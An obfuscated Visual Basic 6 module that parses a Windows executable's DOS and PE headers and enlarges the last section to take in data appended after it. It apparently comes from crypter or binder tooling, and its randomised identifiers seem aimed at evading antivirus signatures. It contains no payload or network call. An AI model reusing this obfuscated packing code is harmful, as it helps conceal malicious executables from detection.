Attribute VB_Name = "Module4"
Option Explicit
Private Const J8fbp           As Long = &H5A4D&
Private Const ZdlIRFgbb            As Long = &H4550&
Private Const mfi8CbLsnay As Long = &H10B&
Private Const H2hycw               As Long = &H40
Private Const yNgnjxA               As Long = &HF8
Private Const yNa3RsDECI           As Long = &H28
Private Type p7dFNVw
e_magic                     As Integer
e_cblp                      As Integer
e_cp                        As Integer
e_crlc                      As Integer
e_cparhdr                   As Integer
e_minalloc                  As Integer
e_maxalloc                  As Integer
e_ss                        As Integer
e_sp                        As Integer
e_csum                      As Integer
e_ip                        As Integer
e_cs                        As Integer
e_lfarlc                    As Integer
e_ovno                      As Integer
e_res(0 To 3)               As Integer
e_oemid                     As Integer
e_oeminfo                   As Integer
e_res2(0 To 9)              As Integer
e_lfanew                    As Long
End Type
Private Type bCgjH
Machine                     As Integer
NumberOfSections            As Integer
TimeDateStamp               As Long
PointerToSymbolTable        As Long
NumberOfSymbols             As Long
SizeOfOptionalHeader        As Integer
characteristics             As Integer
End Type
Private Type x7mThSlG
VirtualAddress              As Long
Size                        As Long
End Type
Private Type AAwK4l
Magic                       As Integer
MajorLinkerVersion          As Byte
MinorLinkerVersion          As Byte
SizeOfCode                  As Long
SizeOfInitializedData       As Long
SizeOfUnitializedData       As Long
AddressOfEntryPoint         As Long
BaseOfCode                  As Long
BaseOfData                  As Long
ImageBase                   As Long
SectionAlignment            As Long
FileAlignment               As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion           As Integer
MinorImageVersion           As Integer
MajorSubsystemVersion       As Integer
MinorSubsystemVersion       As Integer
W32VersionValue             As Long
SizeOfImage                 As Long
SizeOfHeaders               As Long
CheckSum                    As Long
SubSystem                   As Integer
DllCharacteristics          As Integer
SizeOfStackReserve          As Long
SizeOfStackCommit           As Long
SizeOfHeapReserve           As Long
SizeOfHeapCommit            As Long
LoaderFlags                 As Long
NumberOfRvaAndSizes         As Long
DataDirectory(0 To 15)      As x7mThSlG
End Type
Private Type N3c0CwwuAj
Signature                   As Long
FileHeader                  As bCgjH
OptionalHeader              As AAwK4l
End Type
Private Type H5EecQC1PE
SecName                     As String * 8
VirtualSize                 As Long
VirtualAddress              As Long
SizeOfRawData               As Long
PointerToRawData            As Long
PointerToRelocations        As Long
PointerToLinenumbers        As Long
NumberOfRelocations         As Integer
NumberOfLinenumbers         As Integer
characteristics             As Long
End Type
Private Declare Sub a5t4x Lib "kernel32" Alias "RtlMoveMemory" (ifJ1S As Any, Iwg0wXWt7sb As Any, ByVal L As Long)
Public Function Bg61fARh2dG(ByVal OefdjLT1B As String, Optional gImpNl As String) As Boolean
Dim NA7u6yUp() As Byte
On Local Error GoTo Bg61fARh2dG_Error
If gImpNl = vbNullString Then
gImpNl = OefdjLT1B
End If
Open OefdjLT1B For Binary Access Read As #1
ReDim NA7u6yUp(LOF(1) - 1)
Get #1, , NA7u6yUp()
Close
If gCParA(NA7u6yUp) Then
Open gImpNl For Binary Access Write As #1
Put #1, , NA7u6yUp()
Close
End If
Bg61fARh2dG = True
On Error GoTo 0
Exit Function
Bg61fARh2dG_Error:
End Function
Public Function gCParA(ByRef NA7u6yUp() As Byte) As Boolean
Dim wQDf9a                   As Long
Dim vptjM            As Long
Dim J9POzz6gv2       As p7dFNVw
Dim JeFlyFBP9aAB       As N3c0CwwuAj
Dim nhTNO   As H5EecQC1PE
Dim SSVLf               As Long
Dim dyddXHeE                  As Long
Dim fgCyZqT0V9dv()           As Byte
On Local Error GoTo gCParA_Error
a5t4x J9POzz6gv2, NA7u6yUp(0), H2hycw
If Not J9POzz6gv2.e_magic = J8fbp Then
Exit Function
End If
a5t4x JeFlyFBP9aAB, NA7u6yUp(J9POzz6gv2.e_lfanew), yNgnjxA
If Not JeFlyFBP9aAB.Signature = ZdlIRFgbb Then
Exit Function
End If
If Not JeFlyFBP9aAB.OptionalHeader.Magic = mfi8CbLsnay Then
Exit Function
End If
vptjM = J9POzz6gv2.e_lfanew + yNgnjxA + (JeFlyFBP9aAB.FileHeader.NumberOfSections - 1) * yNa3RsDECI
a5t4x nhTNO, NA7u6yUp(vptjM), yNa3RsDECI
wQDf9a = nhTNO.SizeOfRawData
SSVLf = UBound(NA7u6yUp) - nhTNO.SizeOfRawData - nhTNO.PointerToRawData + 1
If (wQDf9a + SSVLf) Mod JeFlyFBP9aAB.OptionalHeader.SectionAlignment = 0 Then
nhTNO.SizeOfRawData = nhTNO.SizeOfRawData + wQDf9a
a5t4x NA7u6yUp(vptjM), nhTNO, yNa3RsDECI
Else
ReDim fgCyZqT0V9dv(SSVLf - 1)
a5t4x fgCyZqT0V9dv(0), NA7u6yUp(UBound(NA7u6yUp) - SSVLf + 1), SSVLf
ReDim Preserve NA7u6yUp(UBound(NA7u6yUp) - SSVLf)
dyddXHeE = SSVLf + JeFlyFBP9aAB.OptionalHeader.SectionAlignment
dyddXHeE = dyddXHeE - (dyddXHeE Mod JeFlyFBP9aAB.OptionalHeader.SectionAlignment)
ReDim Preserve NA7u6yUp(UBound(NA7u6yUp) + dyddXHeE)
a5t4x NA7u6yUp(UBound(NA7u6yUp) - SSVLf + 1), fgCyZqT0V9dv(0), SSVLf
nhTNO.SizeOfRawData = nhTNO.SizeOfRawData + dyddXHeE
a5t4x NA7u6yUp(vptjM), nhTNO, yNa3RsDECI
End If
gCParA = True
On Error GoTo 0
Exit Function
gCParA_Error:
End Function

